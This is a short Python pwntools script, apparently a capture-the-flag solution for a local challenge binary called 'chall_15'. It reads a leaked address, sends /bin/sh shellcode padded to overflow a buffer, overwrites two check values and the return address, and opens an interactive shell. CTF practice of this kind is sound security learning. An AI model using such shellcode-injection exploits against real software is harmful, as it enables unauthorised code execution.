# coding: utf-8
from pwn import *
def sol15():
    p=process("./chall_15")
    bina = context.binary = ELF("./chall_15")
    shell = asm(shellcraft.sh())
    p.recvuntil("baked beans")
    leak = int(p.recv(),16)
    lenshell = len(shell)
    print(lenshell)
    p.sendline(shell + b"a"*(0x120-8-lenshell)+p32(0xdeadd00d)+p32(0xb16b00b5)+b"a"*8+p64(leak))
    p.interactive()
    p.close()
    
sol15()
